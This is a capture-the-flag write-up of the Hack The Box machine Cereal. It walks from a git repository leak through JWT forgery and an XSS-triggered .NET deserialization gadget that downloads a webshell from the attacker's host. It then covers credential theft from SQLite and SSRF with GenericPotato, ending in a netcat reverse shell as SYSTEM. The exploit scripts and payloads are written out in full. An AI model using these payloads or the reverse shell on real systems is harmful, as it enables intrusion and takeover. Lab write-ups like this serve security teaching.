---
icon: golf-club
cover: ../../../../.gitbook/assets/Screenshot 2026-03-04 131246.png
coverY: -5.160863260356979
---

# HTB-CEREAL

### Reconnaissance

#### Port Scanning with Rustscan

Starting with a comprehensive scan to identify active services:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ rustscan -a 10.10.10.217 --ulimit 5000 -- -sCV
```

The scan reveals three open ports with interesting characteristics:

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_7.7
80/tcp  open  http     Microsoft IIS httpd 10.0
443/tcp open  ssl/http Microsoft IIS httpd 10.0
```

Notably, this is a Windows machine running OpenSSH, which is less common. The IIS version 10.0 indicates Windows 10 or Server 2016+. The SSL certificate reveals two hostnames: `cereal.htb` and `source.cereal.htb`. This immediately suggests there's at least a source code repository or development version of the site.

#### Primary Website Enumeration (cereal.htb)

Visiting the HTTPS site after being redirected from HTTP shows a login page. The page source is almost entirely JavaScript, with references to React components like `main.36497136.chunk.css`. This indicates a React-based single-page application rather than traditional server-side rendering.

Directory brute forcing with feroxbuster finds an interesting endpoint:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ feroxbuster -k -u https://cereal.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
```

The scan identifies `/requests` returning a `401 Unauthorized` with a `Bearer` authentication header requirement. This endpoint requires a JWT token to access.

#### Secondary Website Enumeration (source.cereal.htb)

Visiting the subdomain results in a compilation error page revealing critical information:

```
ASP.NET version: 4.7.3690.0
File location: c:\inetpub\source\default.aspx
Error: Unexpected character '>' on line 3
```

This subdomain hosts ASP.NET source code rather than the React frontend. More importantly, nmap's HTTP enumeration script detects a `.git` directory, indicating an exposed Git repository.

***

### Source Code Acquisition and Analysis

#### Git Repository Dumping

Using GitTools' gitdumper to extract the repository:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ ./gitdumper.sh http://source.cereal.htb/.git/ source/
```

The dumped directory contains a `.git` folder but no working files initially. Running `git reset --hard` restores the repository to its last commit state:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ cd source && git reset --hard
HEAD is now at 34b6823 Some changes
```

This reveals a complete C# ASP.NET Core project structure with controllers, models, services, and migrations.

#### Finding the JWT Secret Key

Examining the git log reveals three commits:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ git log
commit 34b68232714f841a274050591ff5595dcf7f85da - Some changes
commit 3a23ffe921530036a4e0c355e6c8d1d4029cb728 - Image updates
commit 7bd9533a2e01ec11dfa928bd491fe516477ed291 - Security fixes
commit 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5 - CEREAL!!
```

The "Security fixes" commit (7bd9) is interesting. Checking that commit:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ git show 7bd9
```

This reveals the JWT key was removed and replaced with asterisks. However, the previous commit in the history contained the actual key. Examining earlier commits shows the JWT secret: **`secretlhfIH&FY*#oysuflkhskjfhefesf`**

#### Understanding JWT Generation

Looking at `Services/UserService.cs`, the JWT is generated with:

```csharp
var tokenHandler = new JwtSecurityTokenHandler();
var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");
var tokenDescriptor = new SecurityTokenDescriptor
{
    Subject = new ClaimsIdentity(new Claim[]
    {
        new Claim(ClaimTypes.Name, user.UserId.ToString())
    }),
    Expires = DateTime.UtcNow.AddDays(7),
    SigningCredentials = new SigningCredentials(
        new SymmetricSecurityKey(key), 
        SecurityAlgorithms.HmacSha256Signature
    )
};
```

The token includes:

* User ID as the Name claim
* 7-day expiration
* HmacSHA256 signature with the key above

***

### Bypassing Authentication

#### JWT Token Forgery

Using Python to generate a valid JWT with the recovered key:

```python
#!/usr/bin/env python3
import jwt
from datetime import datetime, timedelta

token = jwt.encode(
    {
        'name': "1", 
        'exp': datetime.utcnow() + timedelta(days=7)
    }, 
    'secretlhfIH&FY*#oysuflkhskjfhefesf', 
    algorithm="HS256"
)
print(token)
```

This generates a valid JWT that can be used to authenticate. The token is stored in the React application's local storage under the key `currentUser` as a JSON object with a `token` property.

#### Setting Local Storage

Using Firefox Developer Tools → Storage → Local Storage, we add a key/value pair for `cereal.htb`:

```json
{
  "token": "[generated_jwt_token_here]"
}
```

On refreshing the page, the authentication is bypassed and we can access the authenticated features of the application.

***

### RCE via Deserialization

#### Understanding the Vulnerability

The `/requests` endpoint accepts POST requests to create "cereal" objects. Looking at `Controllers/RequestsController.cs`, there's a GET endpoint that deserializes stored JSON:

```csharp
[Authorize(Policy = "RestrictIP")]
[HttpGet("{id}")]
public IActionResult Get(int id)
{
    using (var db = new CerealContext())
    {
        string json = db.Requests.Where(x => x.RequestId == id).SingleOrDefault().JSON;
        
        // Filter to prevent deserialization attacks
        if (json.ToLower().Contains("objectdataprovider") || 
            json.ToLower().Contains("windowsidentity") || 
            json.ToLower().Contains("system"))
        {
            return BadRequest(new { message = "The cereal police have been dispatched." });
        }
        
        var cereal = JsonConvert.DeserializeObject(json, new JsonSerializerSettings
        {
            TypeNameHandling = TypeNameHandling.Auto
        });
        return Ok(cereal.ToString());
    }
}
```

The endpoint filters out common ysoserial gadgets but doesn't block application-specific classes. The `DownloadHelper` class in the same codebase is the key:

```csharp
public class DownloadHelper
{
    private String _URL;
    private String _FilePath;
    
    public String URL
    {
        get { return _URL; }
        set
        {
            _URL = value;
            Download();
        }
    }
    
    public String FilePath
    {
        get { return _FilePath; }
        set
        {
            _FilePath = value;
            Download();
        }
    }
    
    private void Download()
    {
        using (WebClient wc = new WebClient())
        {
            if (!string.IsNullOrEmpty(_URL) && !string.IsNullOrEmpty(_FilePath))
            {
                wc.DownloadFile(_URL, _FilePath);
            }
        }
    }
}
```

When deserialized, setting the URL and FilePath properties triggers the Download method, which can download and save arbitrary files.

#### IP Restriction Bypass

The endpoint is protected by `[Authorize(Policy = "RestrictIP")]`, which only allows requests from localhost (127.0.0.1 or ::1). However, we can use XSS to make the server request itself, bypassing this restriction.

***

### XSS Exploitation Chain

#### Identifying the Vulnerable Component

The AdminPage component displays cereal requests in a table. It renders the title using a vulnerable markdown component:

```jsx
<MarkdownPreview 
    markedOptions={{ sanitize: true }} 
    value={requestData.title} 
/>
```

The `react-marked-markdown` package has a known XSS vulnerability (CVE) where markdown links with javascript URIs execute code.

#### XSS Payload Development

The payload structure is:

```
[link_text](javascript:[code])
```

Due to markdown parsing, special characters need encoding. The working XSS payload to trigger arbitrary JavaScript:

```
[XSS](javascript: document.write%28%22<script>[code]</script>%22%29)
```

This exploits the fact that the markdown parser doesn't properly sanitize javascript: URIs, and the document.write allows us to inject script tags.

***

### Complete Exploitation Chain

#### Step 1: Create Serialized DownloadHelper Payload

A cereal request is submitted with a serialized DownloadHelper object that will download our webshell:

```json
{
  "json": "{'$type':'Cereal.DownloadHelper, Cereal','URL':'http://10.10.14.6/cmdasp.aspx','FilePath': 'C:\\inetpub\\source\\uploads\\shell.aspx'}"
}
```

The response includes the request ID (e.g., `{"message":"Great cereal request!","id":9}`).

#### Step 2: Trigger via XSS

A second cereal request is submitted with an XSS payload that makes the admin/system make a GET request to deserialize the first payload:

```json
{
  "json": "{\"title\":\"[XSS](javascript: document.write%28%22<script>var xhr = new XMLHttpRequest;xhr.open%28'GET', 'https://10.10.10.217/requests/9', true%29;xhr.setRequestHeader%28'Authorization','Bearer [token]'%29;xhr.send%28null%29</script>%22%29)\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"test\"}"
}
```

#### Step 3: Admin Views Admin Page

When an admin (or automated process) views the `/admin` page, it fetches all requests. The XSS payload in the title triggers, executing the JavaScript which makes an authenticated request to `/requests/9`.

#### Step 4: Deserialization and RCE

The GET request causes the server to deserialize the DownloadHelper object. Setting the URL and FilePath properties triggers the Download method, which downloads our webshell to the specified location.

#### Implementation

A Python script automates this process:

```python
#!/usr/bin/env python3
import jwt
import requests
from datetime import datetime, timedelta
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

target = "cereal.htb"
attacker_url = "http://10.10.14.6/cmdasp.aspx"
save_as = "shell.aspx"

# Generate JWT
token = jwt.encode(
    {'name': "1", 'exp': datetime.utcnow() + timedelta(days=7)}, 
    'secretlhfIH&FY*#oysuflkhskjfhefesf', 
    algorithm="HS256"
)
headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}

# Step 1: Upload DownloadHelper
serial_payload = {
    "json": f"{{'$type':'Cereal.DownloadHelper, Cereal','URL':'{attacker_url}','FilePath': 'C:\\\\inetpub\\\\source\\\\uploads\\\\{save_as}'}}"
}
resp = requests.post(f'https://{target}/requests', json=serial_payload, headers=headers, verify=False)
serial_id = resp.json()['id']
print(f"[+] Serialized object uploaded with ID: {serial_id}")

# Step 2: Upload XSS
xss_payload = {
    "json": f"{{\"title\":\"[XSS](javascript: document.write%28%22<script>var xhr = new XMLHttpRequest;xhr.open%28'GET', 'https://{target}/requests/{serial_id}', true%29;xhr.setRequestHeader%28'Authorization','Bearer {token}'%29;xhr.send%28null%29</script>%22%29)\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"test\"}}"
}
resp = requests.post(f'https://{target}/requests', json=xss_payload, headers=headers, verify=False)
print(f"[+] XSS payload sent")
print("[*] Waiting for admin to view the page...")
```

#### Shell Access

After the exploit runs and an admin accesses the admin page, the webshell is downloaded to the uploads directory and accessible at:

```
https://cereal.htb/uploads/shell.aspx
```

The webshell can execute arbitrary commands on the system.

***

### Shell as sonny

#### Database Enumeration

Exploring the web directory structure reveals `C:\inetpub\cereal\db\cereal.db`, an SQLite database. The database contains user credentials:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ sqlite3 cereal.db
sqlite> select * from Users;
1|sonny|mutual.madden.manner38974|
```

#### SSH Access

The credentials `sonny:mutual.madden.manner38974` work over SSH:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ sshpass -p 'mutual.madden.manner38974' ssh sonny@10.10.10.217
Microsoft Windows [Version 10.0.17763.1817]

sonny@CEREAL C:\Users\sonny>
```

***

### Privilege Escalation

#### Enumeration of Internal Services

Running `netstat` reveals several services listening internally that weren't visible in the initial port scan:

```
sonny@CEREAL C:\Users\sonny> netstat -ano | findstr LISTENING
TCP    0.0.0.0:8080        LISTENING    (system)
TCP    0.0.0.0:8172        LISTENING    (system)
```

Port 8080 is interesting as it appears to be another web service. SSH tunneling to access it:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ ssh -L 8888:127.0.0.1:8080 sonny@10.10.10.217
```

Visiting `http://127.0.0.1:8888` shows a "Manufacturing Plant Status" page using GraphQL to fetch data.

#### GraphQL Enumeration

The page makes a GraphQL query to `/api/graphql`:

```
{ allPlants { id, location, status } }
```

Introspection queries reveal the available mutations:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ curl -d '{ "query": "{__schema{types{name,fields{name}}}}" }' -X POST http://127.0.0.1:8888/api/graphql -H 'Content-Type: application/json'
```

Available mutations include:

* `haltProduction(int plantId)`
* `resumeProduction(int plantId)`
* `updatePlant(int plantId, float version, string sourceURL)`

#### SSRF via GraphQL

The `updatePlant` mutation accepts a `sourceURL` parameter, which the application fetches:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ curl -d '{ "query": "mutation{updatePlant(plantId:1, version: 223.0, sourceURL: \"http://10.10.14.6/ssrf-test\")}" }' -X POST http://127.0.0.1:8888/api/graphql -H 'Content-Type: application/json'
```

This is a server-side request forgery vulnerability. The server running as SYSTEM will make HTTP requests to our specified URL.

#### GenericPotato Exploitation

GenericPotato is a tool designed to exploit SSRF/file write vulnerabilities combined with the ability to steal authentication tokens. The attack works by:

1. Setting up an HTTP listener that receives requests from the SYSTEM process
2. Extracting the authentication token from that process
3. Impersonating the SYSTEM token to launch a reverse shell

Building GenericPotato from source:

```
C:\Users\gokuji\Desktop\GenericPotato-main> [Build in Visual Studio]
```

Uploading to the target:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ scp GenericPotato.exe sonny@10.10.10.217:\programdata\
```

Running the exploit:

```
PS C:\programdata> .\GenericPotato.exe -p "C:\programdata\nc64.exe" -a "10.10.14.6 443 -e powershell" -e HTTP
[+] Starting HTTP listener on port http://127.0.0.1:8888
[+] Listener ready
```

Triggering the SSRF:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ curl -d '{ "query": "mutation{updatePlant(plantId:1, version: 223.0, sourceURL: \"http://localhost:8888\")}" }' -X POST http://127.0.0.1:8888/api/graphql -H 'Content-Type: application/json'
```

GenericPotato intercepts the SYSTEM process connection, extracts its token, and launches netcat:

```
[+] Starting HTTP listener on port http://127.0.0.1:8888
[+] Listener ready
Request for: /
Client: NT AUTHORITY\SYSTEM
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching C:\programdata\nc64.exe
[+] Process created, enjoy!
```

#### Root Access

The reverse shell connects as SYSTEM:

```
┌──(sn0x㉿sn0x)-[~/HTB/Cereal]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.217] 51109
Windows PowerShell 

PS C:\Windows\system32> whoami
nt authority\system
```

***

### Attack Flow

```
Initial Reconnaissance
├─ Rustscan: Identify IIS on ports 80/443 and SSH
├─ Website: Discover React-based SPA with login
├─ Subdomain discovery: Find source.cereal.htb
└─ Git detection: Identify exposed .git repository

Source Code Analysis
├─ Git dump: Extract repository via gitdumper
├─ Git log: Review commit history
├─ Key recovery: Find JWT secret in old commits
└─ Code review: Identify DownloadHelper class & deserialization

Authentication Bypass
├─ Understand JWT creation: HmacSHA256 with hardcoded key
├─ Generate valid JWT: Create token with name="1"
├─ Local storage injection: Add token to browser storage
└─ Access authenticated features: Bypass login page

RCE via Deserialization
├─ Identify DownloadHelper gadget: Class with file download capability
├─ Understand IP restriction: RestrictIP requires localhost
├─ Discover XSS vulnerability: react-marked-markdown markdown parsing
├─ Create serialized payload: DownloadHelper to download webshell
├─ Create XSS payload: JavaScript to trigger deserialization
├─ Admin page trigger: XSS in title causes admin to access GET /requests/[id]
└─ Webshell download: DownloadHelper downloads and saves ASPX shell

Database Exploitation
├─ Discover SQLite database: cereal.db in web directory
├─ Extract credentials: User table contains sonny:password
└─ SSH access: Connect as sonny with recovered password

Internal Service Discovery
├─ netstat enumeration: Find port 8080 service
├─ SSH tunneling: Access internal GraphQL API
└─ GraphQL introspection: Discover updatePlant mutation

SSRF to Privilege Escalation
├─ GraphQL mutation analysis: updatePlant accepts sourceURL
├─ SSRF vulnerability: Server fetches URL as SYSTEM
├─ GenericPotato setup: Create HTTP token theft listener
├─ Trigger SSRF: updatePlant points to localhost:8888
├─ Token extraction: GenericPotato receives SYSTEM request
└─ Reverse shell: Execute netcat as SYSTEM user

Flag Recovery
└─ Root flag: Read from Administrator desktop
```

***

### Techniques

| Technique                         | Classification         | Where Used                       | Why It Works                                                                                      |
| --------------------------------- | ---------------------- | -------------------------------- | ------------------------------------------------------------------------------------------------- |
| Git Repository Exposure           | Information Disclosure | source.cereal.htb/.git           | Directory listing disabled but Git objects accessible via enumeration                             |
| Commit History Analysis           | Credential Recovery    | Git log shows removed secrets    | Previous commits contain hardcoded values later removed as "security fixes"                       |
| JWT Token Forgery                 | Authentication Bypass  | Create fake token with known key | HMAC-SHA256 signature created with hardcoded key from git history                                 |
| Local Storage Injection           | Session Hijacking      | React application state          | Browser stores authentication token in local storage; can be set via developer tools              |
| .NET Deserialization RCE          | Code Execution         | JsonConvert.DeserializeObject    | TypeNameHandling.Auto allows arbitrary class instantiation; DownloadHelper gadget downloads files |
| Property Setter Side Effects      | Code Execution         | DownloadHelper URL/FilePath      | Setting properties triggers private Download method; called during object deserialization         |
| Gadget Chain Bypass               | Evasion                | Filter ObjectDataProvider etc    | Application-specific classes like DownloadHelper not in blacklist                                 |
| XSS via Markdown                  | Code Execution         | react-marked-markdown library    | Vulnerability in markdown parsing allows javascript: URIs in links                                |
| XSS to SSRF Bridge                | Privilege Escalation   | Admin views XSS triggering GET   | XSS payload makes authenticated request from server-side admin session                            |
| IP Restriction Bypass via XSS     | Evasion                | RestrictIP policy bypassed       | XSS on client makes server request itself; bypasses localhost check                               |
| SQLite Database Extraction        | Credential Theft       | Download cereal.db               | Webshell accesses unencrypted database with plaintext passwords                                   |
| SSH Tunneling                     | Internal Access        | Access port 8080 via -L          | SSH port forwarding exposes internal services for enumeration                                     |
| GraphQL Introspection             | API Enumeration        | Discover mutations and queries   | GraphQL introspection queries reveal all available operations                                     |
| SSRF via GraphQL                  | Server Exploitation    | updatePlant sourceURL parameter  | Application fetches URL; can target internal services                                             |
| Token Impersonation               | Privilege Escalation   | GenericPotato HTTP listener      | Steal SYSTEM process token via SSRF; impersonate for RCE                                          |
| Reverse Shell via Service Context | Execution              | Launch netcat as SYSTEM          | Process running as SYSTEM executes reverse shell command                                          |

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
